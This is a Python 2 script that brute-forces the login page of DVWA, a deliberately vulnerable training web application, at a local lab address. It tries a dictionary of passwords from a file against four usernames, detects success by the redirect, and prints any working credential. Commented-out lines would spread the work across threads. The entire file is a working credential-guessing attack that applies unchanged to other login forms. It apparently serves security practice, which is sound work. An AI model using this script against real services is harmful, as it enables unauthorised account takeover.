import urllib2,urllib,cookielib,threading




f = open('dict.txt')
users = ['gordonb','1337','pablo','smithy']
password_dict = f.read().split('\n')
f.close()
start = 0
end = len(password_dict)
step = end / 4
def brute(start,end):
    
    #print 'start: ' + str(start) + 'end: ' + str(end)
    
    url = r'http://192.168.2.129/dvwa/login.php'
    values = {'username':'','password':'','Login':'Login'}
    username = 'admin'
    user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0'
    headers = {'User-Agent':user_agent}
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    for user in users:
        values['username'] = user
        print 'trying user ' + user
        count = 0
        for line in password_dict[start:end]:
            values['password'] = line.strip('\n')
            data = urllib.urlencode(values)
            req = urllib2.Request(url,data,headers)
            response = opener.open(req)
            reurl = response.geturl()
            #print "trying password :",line
            count += 1
            if count % 100 == 0:
                print "count : " ,count
            if url == reurl:
                continue
            else:
                print user + ': ' +line
                break

brute(start,end)
#thread1 = threading.Thread(target=brute,args=(start,end))
#thread2 = threading.Thread(target=brute,args=(step,step * 2))
#thread3 = threading.Thread(target=brute,args=(step * 2,step * 3))
#thread4 = threading.Thread(target=brute,args=(step * 3,end))
#thread1.start()
#thread2.start()
#thread3.start()
#thread4.start()
#thread1.join()
#thread2.join()
#thread3.join()
#thread4.join()

    

